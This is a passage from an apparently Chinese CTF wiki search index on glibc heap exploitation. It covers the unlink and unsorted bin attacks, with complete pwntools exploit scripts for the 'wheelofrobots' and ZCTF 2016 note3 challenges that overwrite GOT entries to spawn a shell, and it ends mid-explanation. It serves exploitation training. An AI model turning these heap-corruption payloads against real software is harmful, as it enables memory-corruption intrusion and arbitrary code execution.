fakechunk += p64 ( 0x40 ) + p64 ( 0xa0 ) change ( 6 , fakechunk ) # trigger unlink remove ( 3 ) \u6784\u9020\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u4e0a\u8ff0\u7684\u6f0f\u6d1e\u5c06\u5df2\u7ecf\u5206\u914d\u7684\u8f6e\u5b50 1 tinny \u6307\u9488\u8986\u76d6\u4e3a destructor \u7684\u5730\u5740\uff0c\u90a3\u4e48\u6b64\u540e\u7f16\u8f91 tinny \u5373\u5728\u7f16\u8f91 destructor \u7684\u5185\u5bb9\uff0c\u8fdb\u800c\u5f53\u6211\u4eec\u518d\u6b21\u7f16\u8f91 destructor \u65f6\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u4f4e\u5730\u5740\u5199\u3002 # make 0x6030F8 point to 0x6030E8 payload = p64 ( 0 ) * 2 + 0x18 * 'a' + p64 ( 0x6030E8 ) change ( 6 , payload ) \u7531\u4e8e\u7a0b\u5e8f\u53ea\u662f\u5728\u6700\u540e\u542f\u52a8\u673a\u5668\u4eba\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u968f\u673a\u8f93\u51fa\u4e00\u4e9b\u8f6e\u5b50\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e00\u65e6\u8f93\u51fa\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u6211\u4eec\u5e76\u4e0d\u80fd\u63a7\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 exit() patch \u4e3a\u4e00\u4e2a ret \u5730\u5740\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u591a\u6b21\u8f93\u51fa\u5185\u5bb9\u4e86\uff0c\u4ece\u800c\u53ef\u4ee5\u6cc4\u6f0f\u4e00\u4e9b got \u8868\u5730\u5740\u3002 \u5176\u5b9e\uff0c\u65e2\u7136\u6211\u4eec\u6709\u4e86\u4efb\u610f\u5730\u5740\u5199\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u67d0\u4e2a got \u5199\u4e3a puts \u7684 plt \u5730\u5740\uff0c\u8fdb\u800c\u8c03\u7528\u76f8\u5e94\u51fd\u6570\u65f6\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5c06\u76f8\u5e94\u5185\u5bb9\u8f93\u51fa\u3002\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u53bb\u91c7\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5728 hitcon stkof \u4e2d\u7528\u8fc7\u8fd9\u79cd\u624b\u6cd5\u4e86\u3002 \u5c06 exit() got \u8868\u4fee\u6539\u4e3a ret \uff0c\u5c31\u901a\u8fc7\u591a\u6b21\u8c03\u7528\u603b\u4f1a\u8f93\u51fa\u88ab\u6211\u4eec\u4fee\u6539\u6307\u9488\u7684\u8f6e\u5b50 hijack \u67d0\u4e2a\u51fd\u6570 got \u4e3a puts \uff0c\u6bd4\u5982 free \u90a3\u4e48\u5b9e\u9645\u4e0a\u4e0d\u662f\u91ca\u653e\u4e86\u662f\u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5185\u5bb9 # make exit just as return write ( elf . got [ 'exit' ], 0x401954 ) \u5728\u6cc4\u6f0f\u4e86\u76f8\u5e94\u7684\u5185\u5bb9\u540e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230 libc \u57fa\u5730\u5740\uff0csystem \u5730\u5740\uff0clibc \u4e2d\u7684 /bin/sh \u5730\u5740\u3002\u8fdb\u800c\u6211\u4eec\u4fee\u6539 free@got \u4e3a system \u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8 shell\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"Pwn/glibc-heap/unlink/#exp_1","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./wheelofrobots\" ) elf = ELF ( \"./wheelofrobots\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( idx , size = 0 ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) if idx == 2 : p . recvuntil ( \"Increase Bender's intelligence: \" ) p . sendline ( str ( size )) elif idx == 3 : p . recvuntil ( \"Increase Robot Devil's cruelty: \" ) p . sendline ( str ( size )) elif idx == 6 : p . recvuntil ( \"Increase Destructor's powerful: \" ) p . sendline ( str ( size )) def remove ( idx ): p . recvuntil ( 'Your choice :' ) p . sendline ( '2' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) def change ( idx , name ): p . recvuntil ( 'Your choice :' ) p . sendline ( '3' ) p . recvuntil ( 'Your choice :' ) p . sendline ( str ( idx )) p . recvuntil ( \"Robot's name: \\n \" ) p . send ( name ) def start_robot (): p . recvuntil ( 'Your choice :' ) p . sendline ( '4' ) def overflow_benderinuse ( inuse ): p . recvuntil ( 'Your choice :' ) p . sendline ( '1' ) p . recvuntil ( 'Your choice :' ) p . send ( '9999' + inuse ) def write ( where , what ): change ( 1 , p64 ( where )) change ( 6 , p64 ( what )) def exp (): print \"step 1 - fastbin attack\" # add a fastbin chunk 0x20 and free it # fastbin \u6307\u9488\u6307\u5411\uff1a2 bender->NULL add ( 2 , 1 ) # 2 bender remove ( 2 ) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 \u8ba9\u6211\u4eec\u80fd\u7f16\u8f91 overflow_benderinuse ( ' \\x01 ' ) # \u8986\u5199 fd 2 0x603138, point to 2 bender's size,\u540e\u9762\u4f2a\u9020\u5806fd\u5c31\u662fdestructor_size # now fastbin 0x20, idx2->0x603138->NULL change ( 2 , p64 ( 0x603138 )) # off-by-one \u8986\u5199 idx2 inuse \u4e3a 1 # \u8ba9\u6211\u4eec\u518d\u4e00\u6b21\u7533\u8bf7 2 bender overflow_benderinuse ( ' \\x00 ' ) # add 2 bender again, fastbin 0x603138->NULL # \u5c06\u539f\u6765 2 bender \u7a7a\u95f4\u7533\u8bf7\u51fa\u6765 add ( 2 , 1 ) # in order to malloc chunk at 0x603138 # \u7ed5\u8fc7fastbin size \u68c0\u67e5\uff1a\u5c06size\u4f4d\u4f2a\u9020\u4e00\u4e2afastbin\u8303\u56f4\u7684\u503c # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # 0x603140 \u662f 3 Devil \u7684size\u4f4d\uff0c\u7533\u8bf7fastbin\u8303\u56f4\u5373\u53ef add ( 3 , 0x20 ) # trigger malloc, set tinny point to 0x603148 add ( 1 ) # \u91ca\u653e\u65e0\u7528\u5806 # wheels must <= 3 # only save tinny(0x603138) remove ( 2 ) remove ( 3 ) print 'step 2 - unlink' # alloc 6 destructor size 60->0x50, chunk content 0x40 add ( 6 , 3 ) # alloc 3 devil, size=20*7=140, bigger than fastbin add ( 3 , 7 ) # edit destructor's size to 1000 by tinny change ( 1 , p64 ( 1000 )) # gdb.attach(p) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64 ( 0 ) + p64 ( 0x20 ) + p64 ( fakechunk_addr - 0x18 ) + p64 ( fakechunk_addr - 0x10 ) + p64 ( 0x20 ) fakechunk = fakechunk . ljust ( 0x40 , 'a' ) fakechunk += p64 ( 0x40 ) + p64 ( 0xa0 ) change ( 6 , fakechunk ) # trigger unlink remove ( 3 ) print 'step 3 - hijack chunk1 ptr' # make 0x6030F8 point to 0x6030E8 payload = p64 ( 0 ) * 2 + 0x18 * 'a' + p64 ( 0x6030E8 ) change ( 6 , payload ) print 'step 4 - hijack exit.got' # make exit just as return write ( elf . got [ 'exit' ], 0x401954 ) print 'step 5' # set wheel cnt =3, 0x603130 in order to start robot write ( 0x603130 , 3 ) # set destructor point to puts@got change ( 1 , p64 ( elf . got [ 'puts' ])) start_robot () p . recvuntil ( 'New hands great!! Thx ' ) puts_addr = p . recvuntil ( '! \\n ' , drop = True ) . ljust ( 8 , ' \\x00 ' ) puts_addr = u64 ( puts_addr ) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] log . success ( 'libc base: ' + hex ( libc_base )) system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) # make free->system write ( elf . got [ 'free' ], system_addr ) # make destructor point to /bin/sh addr write ( 0x6030E8 , binsh_addr ) # get shell remove ( 6 ) p . interactive () pass if __name__ == \"__main__\" : exp ()","title":"EXP"},{"location":"Pwn/glibc-heap/unlink/#zctf-2016-note3","text":"","title":"ZCTF 2016 note3"},{"location":"Pwn/glibc-heap/unlink/#_20","text":"1 2 3 4 5 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)","title":"\u57fa\u672c\u60c5\u51b5"},{"location":"Pwn/glibc-heap/unlink/#_21","text":"\u57fa\u672c\u5806\u7ba1\u7406\uff0c\u6709\u589e\u5220\u6539\u529f\u80fd\u3002 \u5806\u6570\u91cf\u4e0a\u9650\u4e3a 8 \u4e2a\uff0c\u5927\u5c0f\u5728 0~1024 \u4e4b\u95f4\u81ea\u5b9a\u4e49\u3002\u5806\u6307\u9488\u6307\u9488\u548c size \u5206\u522b\u7528\u4e00\u4e2a\u5217\u8868\u5b58\u653e\uff0c\u7ed3\u5408\u540e\u9762\u63a8\u6d4b\u51fa\uff0cqword_6020C0[0] \u4e3a\u4e00\u4e2a\u7f13\u51b2\u533a\uff0c\u5b58\u50a8\u521a\u521a\u64cd\u4f5c\u7684\u5b8c\u7684 chunk_ptr \u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"Pwn/glibc-heap/unlink/#_22","text":"delete \u548c edit \u8bfb\u53d6\u5e8f\u53f7\u65f6\u6709\u70b9\u7279\u6b8a\uff0c\u5c06\u8f93\u5165\u503c\u7ecf\u8fc7\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u76f4\u63a5\u5f53\u505a\u662f\u4e0b\u6807\uff0c \u6ca1\u6709\u518d\u8fdb\u4e00\u6b65\u68c0\u67e5\u4e0b\u6807\u662f\u5426\u975e\u6cd5\u7684 \uff1a v3 = v0 - 7 * ((( signed __int64 )(( unsigned __int128 )( 5270498306774157605L L * ( signed __int128 ) v0 ) >> 64 ) >> 1 ) - ( v0 >> 63 )); \u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6574\u578b\u6ea2\u51fa\uff0c\u5f53\u8f93\u5165\u503c\u4e3a 0x8000000000000000 \uff0c\u7ed3\u679c\u4e3a -1 \uff0c\u8fd9\u6837\u5c31\u5c06\u4fee\u6539\u7f13\u51b2\u533a\u7684\u5806\u5757\uff0c\u4fee\u6539\u7a0b\u5ea6\u4e3a chunk7 \u5730\u5740\uff1a .bss: current_ptr <== edit ptr note0_ptr note1_ptr note2_ptr note3_ptr note4_ptr note5_ptr note6_ptr note7_ptr <== size note0_size note1_size note2_size note3_size note4_size note5_size note6_size note7_size \u7531\u4e8e\u8f93\u5165\u957f\u5ea6\u6709\u9650\uff0c\u6240\u4ee5\u5c06\u539f\u503c\u8f6c\u6362\u4e3a\u8d1f\u6570\uff1a 0x8000000000000000 - 0x10000000000000000 \u3002","title":"\u6f0f\u6d1e"},{"location":"Pwn/glibc-heap/unlink/#_23","text":"\u5229\u7528\u6574\u578b\u6f0f\u6d1e\uff0c\u5f62\u6210\u4e00\u4e2a\u5806\u6ea2\u51fa\u3002\u4fee\u6539 next_chunk \u7684 header \u4fe1\u606f\uff0c\u6784\u9020 unlink \u6761\u4ef6\u3002 unlink \u540e\u63a7\u5236 chunk_ptr \u6307\u9488\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u3002\u7531\u4e8e\u7a0b\u5e8f\u8f93\u51fa\u529f\u80fd\uff0c\u5c06 free \u6539\u4e3a puts \u7528\u6765\u6cc4\u9732\u5730\u5740\uff0c\u7136\u540e\u5728\u5c06 free \u6539\u4e3a system \u3002","title":"\u601d\u8def"},{"location":"Pwn/glibc-heap/unlink/#exp_2","text":"#!/usr/bin/python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'info' , os = 'linux' , arch = 'amd64' ) # p = process(\"./note3\") p = remote ( \"node3.buuoj.cn\" , 25763 ) elf = ELF ( \"./note3\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def add ( size , content ): p . sendlineafter ( '>> \\n ' , '1' ) p . sendlineafter ( '1024) \\n ' , str ( size )) p . sendlineafter ( 'content: \\n ' , content ) def edit ( idx , content ): p . sendlineafter ( '>> \\n ' , '3' ) p . sendlineafter ( 'note: \\n ' , str ( idx )) p . sendlineafter ( 'content: \\n ' , content ) def free ( idx ): p . sendlineafter ( '>> \\n ' , '4' ) p . sendlineafter ( 'note: \\n ' , str ( idx )) def show (): p . sendlineafter ( '>> \\n ' , '2' ) for _ in range ( 3 ): add ( 0x50 , 'a' * 8 ) add ( 0x90 , 'b' * 8 ) for _ in range ( 3 ): add ( 0x50 , 'a' * 8 ) edit ( 2 , 'skyedidi' ) ptr = 0x6020d8 payload = p64 ( 0 ) + p64 ( 0x51 ) payload += p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload = payload . ljust ( 0x50 , 'a' ) payload += p64 ( 0x50 ) + p64 ( 0xa0 ) edit ( 0x8000000000000000 - 0x10000000000000000 , payload ) free ( 3 ) payload = 'skyedidi' + p64 ( elf . got [ 'free' ]) + p64 ( elf . got [ 'puts' ]) payload += p64 ( 0x6020c0 ) edit ( 2 , payload ) edit ( 0 , p64 ( elf . plt [ 'puts' ])[: 7 ]) free ( 1 ) puts_leak = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"puts_leak:\" + hex ( puts_leak )) libc_base = puts_leak - 0x06f690 #libc.sym['puts'] system = libc_base + 0x045390 #libc.sym['system'] binsh = libc_base + 0x18cd57 #next(libc.search('/bin/sh')) edit ( 0 , p64 ( system )[: 7 ]) payload = 'skyedidi' + p64 ( elf . got [ 'free' ]) + p64 ( elf . got [ 'puts' ]) payload += p64 ( binsh ) edit ( 2 , payload ) free ( 2 ) # gdb.attach(p) p . interactive ()","title":"EXP"},{"location":"Pwn/glibc-heap/unsorted_bin_attack/","text":"Unsorted Bin Attack \u00b6 \u6982\u8ff0 \u00b6 Unsorted Bin Attack\uff0c\u987e\u540d\u601d\u4e49\uff0c\u8be5\u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Unsorted Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002 Unsorted Bin Attack \u88ab\u5229\u7528\u7684\u524d\u63d0\u662f\u63a7\u5236 Unsorted Bin Chunk \u7684 bk \u6307\u9488\u3002 Unsorted Bin Attack \u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u662f\u5b9e\u73b0\u4fee\u6539\u4efb\u610f\u5730\u5740\u503c\u4e3a\u4e00\u4e2a\u8f83\u5927\u7684\u6570\u503c\u3002 Unsorted Bin \u56de\u987e \u00b6 \u5728\u4ecb\u7ecd Unsorted Bin \u653b\u51fb\u524d\uff0c\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b Unsorted Bin \u7684\u57fa\u672c\u6765\u6e90\u4ee5\u53ca\u57fa\u672c\u4f7f\u7528\u60c5\u51b5\u3002 \u57fa\u672c\u6765\u6e90 \u00b6 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002 \u5f53\u8fdb\u884c malloc_consolidate \u65f6\uff0c\u53ef\u80fd\u4f1a\u628a\u5408\u5e76\u540e\u7684 chunk \u653e\u5230 unsorted bin \u4e2d\uff0c\u5982\u679c\u4e0d\u662f\u548c top chunk \u8fd1\u90bb\u7684\u8bdd\u3002 \u57fa\u672c\u4f7f\u7528\u60c5\u51b5 \u00b6 Unsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO\uff0c \u5373\u63d2\u5165\u7684\u65f6\u5019\u63d2\u5165\u5230 unsorted bin \u7684\u5934\u90e8\uff0c\u53d6\u51fa\u7684\u65f6\u5019\u4ece\u94fe\u8868\u5c3e\u83b7\u53d6 \u3002 \u5728\u7a0b\u5e8f malloc \u65f6\uff0c\u5982\u679c\u5728 fastbin\uff0csmall bin \u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u5927\u5c0f\u7684 chunk\uff0c\u5c31\u4f1a\u5c1d\u8bd5\u4ece Unsorted Bin \u4e2d\u5bfb\u627e chunk\u3002\u5982\u679c\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u521a\u597d\u6ee1\u8db3\uff0c\u5c31\u4f1a\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5426\u5219\u5c31\u4f1a\u628a\u8fd9\u4e9b chunk \u5206\u522b\u63d2\u5165\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 \u539f\u7406 \u00b6 \u5728 glibc / malloc / malloc.c \u4e2d\u7684 _int_malloc \u6709\u8fd9\u4e48\u4e00\u6bb5\u4ee3\u7801\uff0c\u5f53\u5c06\u4e00\u4e2a unsorted bin \u53d6\u51fa\u7684\u65f6\u5019\uff0c\u4f1a\u5c06 bck->fd \u7684\u4f4d\u7f6e\u5199\u5165\u672c Unsorted Bin \u7684\u4f4d\u7f6e\u3002 /* remove from unsorted list */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): corrupted unsorted chunks 3\" ); unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); \u6362\u800c\u8a00\u4e4b\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86 bk \u7684\u503c\uff0c\u6211\u4eec\u5c31\u80fd\u5c06 unsorted_chunks (av) \u5199\u5230\u4efb\u610f\u5730\u5740\u3002 \u8fd9\u91cc\u6211\u4ee5 shellphish \u7684 how2heap \u4ed3\u5e93\u4e2d\u7684 unsorted_bin_attack.c \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u6211\u505a\u4e00\u4e9b\u7b80\u5355\u7684\u4fee\u6539\uff0c\u5982\u4e0b #include <stdio.h> #include <stdlib.h> int main () { fprintf ( stderr , \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack \\n \" ); fprintf ( stderr , \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack \\n\\n \" ); unsigned long target_var = 0 ; fprintf ( stderr , \"Let's first look at the target we want to rewrite on stack: \\n \" ); fprintf ( stderr , \"%p: %ld \\n\\n \" , & target_var , target_var ); unsigned long * p = malloc ( 400 ); fprintf ( stderr , \"Now, we allocate first normal chunk on the heap at: %p \\n \" , p ); fprintf ( stderr , \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free() \\n\\n \" ); malloc ( 500 ); free ( p ); fprintf ( stderr , \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to %p \\n \" , ( void * ) p [ 1 ]); /*------------VULNERABILITY-----------*/ p [ 1 ] = ( unsigned long )( & target_var - 2 ); fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the \" \"victim->bk pointer \\n \" ); fprintf ( stderr , \"And we write it with the target address-16 (in 32-bits \" \"machine, it should be target address-8):%p \\n\\n \" , ( void * ) p [ 1 ]); //------------------------------------ malloc ( 400 ); fprintf ( stderr , \"Let's malloc again to get the chunk we just free. During \" \"this time, target should has already been \" \"rewrite: \\n \" ); fprintf ( stderr , \"%p: %p \\n \" , & target_var , ( void * ) target_var ); } \u7a0b\u5e8f\u6267\u884c\u540e\u7684\u6548\u679c\u4e3a \u279c unsorted_bin_attack git:(master) \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack \u279c unsorted_bin_attack git:(master) \u2717 ./unsorted_bin_attack This file demonstrates unsorted bin attack by write a large unsigned long value into stack In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack Let's first look at the target we want to rewrite on stack: 0x7ffe0d232518: 0 Now, we allocate first normal chunk on the heap at: 0x1fce010 And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free() We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u56fe\u6765\u63cf\u8ff0\u4e00\u4e0b\u5177\u4f53\u53d1\u751f\u7684\u6d41\u7a0b\u4ee5\u53ca\u80cc\u540e\u7684\u539f\u7406\u3002 \u521d\u59cb\u72b6\u6001\u65f6 unsorted bin \u7684 fd \u548c bk \u5747\u6307\u5411 unsorted bin \u672c\u8eab\u3002 \u6267\u884c free(p) \u7531\u4e8e\u91ca\u653e\u7684 chunk \u5927\u5c0f\u4e0d\u5c5e\u4e8e fast bin \u8303\u56f4\u5185\uff0c\u6240\u4ee5\u4f1a\u9996\u5148\u653e\u5165\u5230 unsorted bin \u4e2d\u3002 \u4fee\u6539 p[1] \u7ecf\u8fc7\u4fee\u6539\u4e4b\u540e\uff0c\u539f\u6765\u5728 unsorted bin \u4e2d\u7684 p \u7684 bk \u6307\u9488\u5c31\u4f1a\u6307\u5411 target addr-16 \u5904\u4f2a\u9020\u7684 chunk\uff0c\u5373 Target Value \u5904\u4e8e\u4f2a\u9020 chunk \u7684 fd \u5904\u3002 \u7533\u8bf7 400 \u5927\u5c0f\u7684 chunk \u6b64\u65f6\uff0c\u6240\u7533\u8bf7\u7684 chunk \u5904\u4e8e small bin \u6240\u5728\u7684\u8303\u56f4\uff0c\u5176\u5bf9\u5e94\u7684 bin \u4e2d\u6682\u65f6\u6ca1\u6709 chunk\uff0c\u6240\u4ee5\u4f1a\u53bb unsorted bin \u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002 while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { bck = victim -> bk ; if ( __builtin_expect ( chunksize_nomask ( victim ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize_nomask ( victim ) > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); size = chunksize ( victim ); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ /* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/ if ( in_smallbin_range ( nb ) && bck == unsorted_chunks ( av ) && victim == av -> last_remainder && ( unsigned long ) ( size ) > ( unsigned long ) ( nb + MINSIZE )) { .... } /* remove from unsorted list */ unsorted_chunks ( av ) -> bk = bck ; bck -> fd = unsorted_chunks ( av ); victim = unsorted_chunks(av)->bk=p bck = victim->bk=p->bk = target addr-16 unsorted_chunks(av)->bk = bck=target addr-16 bck->fd = *(target addr -16+16) = unsorted_chunks(av); \u4e0a\u9762\u56db\u6b65\u5c31\u662f\u904d\u5386\u5bfb\u627e unsorted bin \u4e2d\u662f\u5426\u6709\u7b26\u5408\u7533\u8bf7\u5927\u5c0f\u7684 chunk \uff0c\u4e0a\u9762\u8fd9\u4e2a\u662f bin \u4e2d chunk \u5927\u5c0f\u5927\u4e8e\u7533\u8bf7 size + MINSIZE \u7684\u60c5\u51b5\u3002 \u524d\u9762\u4e24\u4e2a\u662f\u53d8\u91cf\u7684\u5b9a\u4e49\uff1avictim \u5f53\u524d\u5806\u3001bck \u540e\u4e00\u5757\u5806\uff1b \u540e\u9762\u662f\u904d\u5386\u5408\u9002 chunk \u4e4b\u540e unlink \u53d6\u51fa\u64cd\u4f5c\uff1a unsorted_chunks(av) \u524d\u4e00\u5757\u5806\u7684 bk \u6307\u9488\u6307\u5411\u540e\u4e00\u5757\u5806\u5757 bck \uff1b \u540e\u4e00\u5757\u5806\u5757 bck fd \u6307\u9488\u6307\u5411\u524d\u4e00\u5757\u5806\u5757 unsorted_chunks(av) \uff1b \u56db\u6b65\u4e2d victim fd \u4e00\u76f4\u6ca1\u6709\u88ab\u4f7f\u7528\u8fc7\uff1bbk \u6307\u9488\u5f71\u54cd bck\u3001bck->fd \u7684\u503c\u3002\u5982\u679c\u6211\u4eec\u80fd\u591f\u63a7\u5236 victim \u7684 bk \u6307\u9488\u5c31\u80fd\u5c06 unsorted_chunks(av) \u8fd9\u4e2a\u5730\u5740\u503c\u5199\u5230\u4efb\u610f\u5730\u5740\uff08\u539f\u56e0\u770b\u9762 unlink \u7684\u7b2c\u56db\u6b65\uff09 \uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a unsorted_chunks(av) \u7684\u5730\u5740\u503c\u4e3a\uff1a0x61616161 \uff0c\u60f3\u5c06\u5176\u5199\u5165\u5230 target_addr \u3002\u63a7\u5236 victim->bk \u4e3a\uff1atarget_addr - 16 \uff0c\u5f53\u8fdb\u884c unlink \u65f6\u4f1a\u6267\u884c\uff1abck->fd = *(target_addr -16+16) = unsorted_chunks(av); \uff0c\u6210\u529f\u5c06 0x61616161 \u5199\u5165\u5230 target_addr **\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002**\u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002 \u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002 We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78 Now emulating a vulnerability that can overwrite the victim->bk pointer And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508 Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite: 0x7ffe0d232518: 0x7f1c705ffb78 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4 \u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002\uff08\u4fee\u6539\u4efb\u610f\u5730\u5740\u5185\u5bb9\uff0c\u5185\u5bb9\u4e0d\u53ef\u63a7\uff09 \u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 